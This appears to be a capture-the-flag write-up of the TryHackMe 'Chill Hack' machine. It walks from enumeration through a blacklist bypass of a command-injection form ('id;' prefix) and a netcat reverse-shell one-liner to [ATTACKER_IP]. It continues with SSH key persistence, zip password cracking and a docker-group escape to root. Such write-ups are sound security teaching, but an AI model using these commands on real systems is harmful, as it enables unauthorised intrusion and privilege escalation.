# [Chill Hack](https://tryhackme.com/room/chillhack)

Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!

## Enumeration

```bash
$ nmap -sC -sV -A 10.10.129.224

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-31 18:53 GMT
Nmap scan report for 10.10.129.224
Host is up (0.026s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:[ATTACKER_IP]
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds
```

### FTP enumeration 

```bash
 ftp 10.10.129.224

Connected to 10.10.129.224.
220 (vsFTPd 3.0.3)
Name (10.10.129.224:clobee): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -ail
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03 04:33 .
drwxr-xr-x    2 0        115          4096 Oct 03 04:33 ..
-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
226 Directory send OK.

ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 0.00 secs (29.5629 kB/s)
ftp>
```

```bash
$ cat note.txt

Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

### Directories listing

```bash
$ gobuster dir -u http://10.10.129.224 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.129.224
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/31 19:03:19 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/secret (Status: 301)
```

### Command Injection

Thanks to gobuster we have direscovered a page with a form that seem interesting

```bash
$ curl http://10.10.129.224/secret/
<html>
<body>

<form method="POST">
        <input id="comm" type="text" name="command" placeholder="Command">
        <button>Execute</button>
</form>
</body>
</html>
```

After a good while, I have noticed that the command form has a blacklist of commands that trigger an alert. 
Prefixing the commands with `id;` seems to bypass the firewall in place.

Thanks to this issue on the firewall we were able to gather information from the server

```bash
::::::::::::::
/etc/passwd
::::::::::::::
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
apaar:x:1001:1001:,,,:/home/apaar:/bin/bash
anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash
ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

A list of users:

- root 
- apaar
- aurick
- anurodh 


```bash
id;ls -ail /home/apaar

total 44
655374 drwxr-xr-x 5 apaar apaar 4096 Oct  4 14:11 .
655361 drwxr-xr-x 5 root  root  4096 Oct  3 04:28 ..
655391 -rw------- 1 apaar apaar    0 Oct  4 14:14 .bash_history
655375 -rw-r--r-- 1 apaar apaar  220 Oct  3 04:25 .bash_logout
655376 -rw-r--r-- 1 apaar apaar 3771 Oct  3 04:25 .bashrc
655389 drwx------ 2 apaar apaar 4096 Oct  3 05:20 .cache
655387 drwx------ 3 apaar apaar 4096 Oct  3 05:20 .gnupg
655380 -rwxrwxr-x 1 apaar apaar  286 Oct  4 14:11 .helpline.sh
655377 -rw-r--r-- 1 apaar apaar  807 Oct  3 04:25 .profile
655385 drwxr-xr-x 2 apaar apaar 4096 Oct  3 05:19 .ssh
655381 -rw------- 1 apaar apaar  817 Oct  3 04:27 .viminfo
655378 -rw-rw---- 1 apaar apaar   46 Oct  4 07:25 local.txt
```

```bash
id;cat /home/apaar/.ssh/authorized_keys

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3BzOCWTm3aFsN/RKd4n4tBT71A+vJYONyyrDDj59Pv8lnVTtxi1/VI2Nb/op1nHUcuz1tYMJDMew2kkb+5CX6uiYfnryzD4OQoQUhC4tMSmopIoAi322Y5QSzSY1mSBESddCsn0C5VgE9in4PFl3rFv/k05hJDTXewmCh06vN7OAT5CLbf9lTtf1/Ga40pRixYFlV5owqZci697h17Is1K7RSFCQZwLGl29pLHPBwOpXkHpJqNqEl6Wgu+y0jvauNKzgIypD0EyojgX+1OPogSEr8WNuOc8w6wqQm6gTaAayPioIATTD/ECDBMJPLYN71t6Wdi5E+7R2GT6BIRFiGhTG65KXwXj6Vn7bj99BLSlaq2Qk6oUYpxhhkaE5koPKCJHb9zBsrGEUHTOMFjKhCypQCtjG9noW2jzm+/beqKcEZINQEQfzQFIGKdH0ypGfCCvD6YFUg7lcqQQH5Zd+9a95/5WyUE0XkNzJzU/yxfQ8RDB2In/ZptDYNBFoHXfM= root@ubuntu
```

## Shell access

None of the usual reverse shell I have in my toolkit where working on the target.
I had luck with `id;r"m" /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER_IP] 1234 >/tmp/f`

```bash
$ nc -nvlp 1234

Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.129.224.
Ncat: Connection from 10.10.129.224:59906.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Privileges escalation: www-data -> apaar

```bash
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh

$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

jane
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
Thank you for your precious time!

$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

jane
/bin/bash
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
```

```bash
cat /home/apaar/local.txt
{USER-FLAG: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

### Maintaining Access: Persistence

I created a key on my machine

```bash
$ ssh-keygen

Generating public/private rsa key pair.
Enter file in which to save the key (/home/clobee/.ssh/id_rsa): tryhackme
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in tryhackme
Your public key has been saved in tryhackme.pub
The key fingerprint is:
SHA256:5jKx/4Rg3iLhgXG+WZ5SM535UL6ZsygQG9HnVznhm9w clobee@kali
The key's randomart image is:
+---[RSA 3072]----+
|     .      .o   |
|    . . .  .+    |
|  . .. o  ....   |
|   =o  ..=.. +   |
|  . ++O S.. + E  |
|   .o@ @ + +     |
|    *.O + B      |
|     o.= o o     |
|       .o.o      |
+----[SHA256]-----+
$ chmod 600 tryhackme

$ cat tryhackme.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOa1AOXzy8E1Y9bbE9IoxHSdskeN1S38hEjOuoShn9SlSWlWsKxKObMjKs7dmzxi3B+VPiJ9FqUc+ZC6JJpoDz7jCdsTnKsLCV3vGeg8BK7stp1MUd+bBuPsCHjsUzbQRLVpiC/KtOhcOAvC/kvKX/c5/inXMJowdKj5ElYXpOaAOz5H7U3sE9coqsfTD8DiDtwapXjyvYRFy2gRreUB4Z9bsM74LXN7LKXt9AWcfcNi7JzFOTPlAcYLxw1yRKAu9nhOW1/8Wj7qQEFIRTyYq73v0kY3VBPZwV09JCaX2GGe2/1jtDfG/qHtw79D5MqtRxDCuTtYNmwDI2MV8Oa0Brz2S9OIIHjzzA+8qUcBCggIq86zwreQutuAKxdrEFU5tk5/nttia9K9JZhU9Vn/8+FGLK0kFv/TXg5kAahYN3jC4RYnN6ZYYVNH9P7KJUZizJj5993NdAUeWHTTzeEEmZDJgbZ5I/IcDQJkUixAAWlhFGQqdoENs4/Uk8m2pVkGk= clobee@kali
```

And added it on the victim user apaar authorize_keys

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOa1AOXzy8E1Y9bbE9IoxHSdskeN1S38hEjOuoShn9SlSWlWsKxKObMjKs7dmzxi3B+VPiJ9FqUc+ZC6JJpoDz7jCdsTnKsLCV3vGeg8BK7stp1MUd+bBuPsCHjsUzbQRLVpiC/KtOhcOAvC/kvKX/c5/inXMJowdKj5ElYXpOaAOz5H7U3sE9coqsfTD8DiDtwapXjyvYRFy2gRreUB4Z9bsM74LXN7LKXt9AWcfcNi7JzFOTPlAcYLxw1yRKAu9nhOW1/8Wj7qQEFIRTyYq73v0kY3VBPZwV09JCaX2GGe2/1jtDfG/qHtw79D5MqtRxDCuTtYNmwDI2MV8Oa0Brz2S9OIIHjzzA+8qUcBCggIq86zwreQutuAKxdrEFU5tk5/nttia9K9JZhU9Vn/8+FGLK0kFv/TXg5kAahYN3jC4RYnN6ZYYVNH9P7KJUZizJj5993NdAUeWHTTzeEEmZDJgbZ5I/IcDQJkUixAAWlhFGQqdoENs4/Uk8m2pVkGk= clobee@kali
" >> /home/apaar/.ssh/authorized_keys 
```

Which gave me a proper entry point on the victim machine (no need to run the reverse shell anymore)

```bash
$ ssh -i tryhackme apaar@10.10.129.224

The authenticity of host '10.10.129.224 (10.10.129.224)' can't be established.
ECDSA key fingerprint is SHA256:ybdflPQMn6OfMBIxgwN4h00kin8TEPN7r8NYtmsx3c8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.129.224' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec 31 23:24:46 UTC 2020

  System load:  0.0                Processes:              134
  Usage of /:   24.8% of 18.57GB   Users logged in:        0
  Memory usage: 28%                IP address for eth0:    10.10.129.224
  Swap usage:   0%                 IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

19 packages can be updated.
0 updates are security updates.


Last login: Sun Oct  4 14:05:57 2020 from 192.168.184.129
apaar@ubuntu:~$ 
```

## Server exploitation

I went on looking into the weaknesses of the server and found 2 interresting ports: 3306 and 9001

```bash
apaar@ubuntu:~$ ss -tunlp

Netid        State           Recv-Q          Send-Q                         Local Address:Port                   Peer Address:Port         
udp          UNCONN          0               0                              127.0.0.53%lo:53                          0.0.0.0:*            
udp          UNCONN          0               0                         10.10.129.224%eth0:68                          0.0.0.0:*            
tcp          LISTEN          0               128                                127.0.0.1:9001                        0.0.0.0:*            
tcp          LISTEN          0               80                                 127.0.0.1:3306                        0.0.0.0:*            
tcp          LISTEN          0               128                            127.0.0.53%lo:53                          0.0.0.0:*            
tcp          LISTEN          0               128                                  0.0.0.0:22                          0.0.0.0:*            
tcp          LISTEN          0               128                                        *:80                                *:*            
tcp          LISTEN          0               32                                         *:21                                *:*            
tcp          LISTEN          0               128                                     [::]:22                             [::]:*            
apaar@ubuntu:~$ 
```

### Port exploration: 9001

I mapped the port 9001 to my localhost:9999 using the following command

```bash
$ ssh -L 9999:localhost:9001 -i /home/clobee/.ssh/tryhackme apaar@10.10.129.224
```

```bash
$ nmap -sC -A localhost -p9999

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-31 23:50 GMT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000066s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
9999/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.14 seconds
```

```bash
h$ curl localhost:9999
<html>
<body>
<link rel="stylesheet" type="text/css" href="style.css">
	<div class="signInContainer">
		<div class="column">
			<div class="header">
				<h2 style="color:blue;">Customer Portal</h2>
				<h3 style="color:green;">Log In<h3>
			</div>
			<form method="POST">
				                		<input type="text" name="username" id="username" placeholder="Username" required>
				<input type="password" name="password" id="password" placeholder="Password" required>
				<input type="submit" name="submit" value="Submit">
        		</form>
		</div>
	</div>
</body>
</html>
```

### Port exploration: 3306


```bash
apaar@ubuntu:~$ mysql -uroot
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
```


### Applications enumeration

```bash
apaar@ubuntu:~$ cd /var/www

apaar@ubuntu:/var/www$ ls
files  html

apaar@ubuntu:/var/www$ cd html

apaar@ubuntu:/var/www/html$ ls
about.html    contact.php  images      news.html    single-blog.html
blog.html     css          index.html  preview_img  style.css
contact.html  fonts        js          secret       team.html

apaar@ubuntu:/var/www/html$ cd ../files

apaar@ubuntu:/var/www/files$ ls -ail
total 28
 530143 drwxr-xr-x 3 root root 4096 Oct  3 04:40 .
1050401 drwxr-xr-x 4 root root 4096 Oct  3 04:01 ..
 530145 -rw-r--r-- 1 root root  391 Oct  3 04:01 account.php
 530146 -rw-r--r-- 1 root root  453 Oct  3 04:02 hacker.php
 530144 drwxr-xr-x 2 root root 4096 Oct  3 06:30 images
 530147 -rw-r--r-- 1 root root 1153 Oct  3 04:02 index.php
 530150 -rw-r--r-- 1 root root  545 Oct  3 04:07 style.css
```

```bash
apaar@ubuntu:/var/www/files$ cat hacker.php 
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
        color:red;
        font-weight: bold;
}
h1
{
        color: yellow;
        font-weight: bold;
}
</style>
<center>
        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
```

### Images analysis

Let's download this image. they might be interresting

```bash
$ scp -i ~/.ssh/tryhackme apaar@10.10.129.224:/var/www/files/images/* .
002d7e638fb463fb7a266f5ffc7ac47d.gif                                                                 100% 2035KB   3.4MB/s   00:00    
hacker-with-laptop_23-2147985341.jpg                                                                 100%   67KB   1.4MB/s   00:00    
```

```bash
$ steghide info hacker-with-laptop_23-2147985341.jpg
"hacker-with-laptop_23-2147985341.jpg":
  format: jpeg
  capacity: 3.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "backup.zip":
    size: 750.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes

$ steghide info 002d7e638fb463fb7a266f5ffc7ac47d.gif 
steghide: the file format of the file "002d7e638fb463fb7a266f5ffc7ac47d.gif" is not supported.
```

```bash
$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg
Enter passphrase: 
wrote extracted data to "backup.zip".

$ ls
total 2472
10224756 drwxr-xr-x 2 clobee    4096 Jan  1 00:44 .
10224705 drwxr-xr-x 9 clobee    4096 Dec 31 18:49 ..
10224768 -rw-r--r-- 1 clobee 2083694 Jan  1 00:42 002d7e638fb463fb7a266f5ffc7ac47d.gif
10224771 -rw-r--r-- 1 clobee     750 Jan  1 00:44 backup.zip
10224769 -rw-r--r-- 1 clobee   68841 Jan  1 00:42 hacker-with-laptop_23-2147985341.jpg
10224770 -rw-r--r-- 1 clobee     750 Jan  1 00:43 hacker-with-laptop_23-2147985341.jpg.out
10224767 -rw-r--r-- 1 clobee   68841 Jan  1 00:42 image.gif
10224763 -rw------- 1 clobee     564 Dec 31 19:51 key
10224757 -rw-r--r-- 1 clobee      90 Dec 31 18:55 note.txt
10224764 -rw-r--r-- 1 clobee  274432 Jan  1 00:44 typescript
10224766 -rw-r--r-- 1 clobee      66 Jan  1 00:23 users.txt
```

```bash
$ zip2john backup.zip > hash
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3

$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

pass1word        (backup.zip/source_code.php)

1g 0:00:00:00 DONE (2021-01-01 00:49) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s total90..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Privileges escalation: apaar -> anurodh

Let's explore what is in the hidden content

```bash
$ unzip backup.zip 
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php         

$ cat source_code.php 
<html>
<head>
	Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
			Email: <input type="email" name="email" placeholder="email"><br><br>
			Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
		</form>
<?php
        if(isset($_POST['submit']))
	{
		$email = $_POST["email"];
		$password = $_POST["password"];
		if(base64_encode($password) == "XXXXXXXXXXXXXXXXXXXXXXXXXXXX")
		{ 
			$random = rand(1000,9999);?><br><br><br>
			<form method="POST">
				Enter the OTP: <input type="number" name="otp">
				<input type="submit" name="submitOtp" value="Submit">
			</form>
		<?php	mail($email,"OTP for authentication",$random);
			if(isset($_POST["submitOtp"]))
				{
					$otp = $_POST["otp"];
					if($otp == $random)
					{
						echo "Welcome Anurodh!";
						header("Location: authenticated.php");
					}
					else
					{
						echo "Invalid OTP";
					}
				}
 		}
		else
		{
			echo "Invalid Username or Password";
		}
        }
?>
</html>
```

Now we have Anurodh password

```bash
$ echo 'XXXXXXXXXXXXXXXXXXXXXXXXXXXX' | base64 --decode
YYYYYYYYYYYYYYYYYYYYYYYYYYY
```

```bash
apaar@ubuntu:~$ su anurodh
Password: 
anurodh@ubuntu:/home/apaar$ 
```

### Privileges escalation: anurodh -> root

```bash
anurodh@ubuntu:/home/apaar$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

User anurodh is part of the group `docker`.
The group docker might have access to docker command.
Checking GTFobin I came up with the following command

```bash
anurodh@ubuntu:/home/apaar$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
id
# uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

Which gave me access to the root account 

```bash
# ls -ail /root/
total 68
1048578 drwx------  6 root root  4096 Oct  4 14:13 .
      2 drwxr-xr-x 24 root root  4096 Oct  3 03:33 ..
1050409 -rw-------  1 root root     0 Oct  4 14:14 .bash_history
1048747 -rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
1057738 drwx------  2 root root  4096 Oct  3 06:40 .cache
1057730 drwx------  3 root root  4096 Oct  3 05:37 .gnupg
1057734 -rw-------  1 root root   370 Oct  4 07:36 .mysql_history
1048748 -rw-r--r--  1 root root   148 Aug 17  2015 .profile
1057735 -rw-r--r--  1 root root 12288 Oct  4 07:44 .proof.txt.swp
1049207 drwx------  2 root root  4096 Oct  3 03:40 .ssh
 530149 drwxr-xr-x  2 root root  4096 Oct  3 04:07 .vim
1057733 -rw-------  1 root root 11683 Oct  4 14:13 .viminfo
1057562 -rw-r--r--  1 root root   166 Oct  3 03:55 .wget-hsts
1057736 -rw-r--r--  1 root root  1385 Oct  4 07:42 proof.txt

# cat /root/proof.txt
```
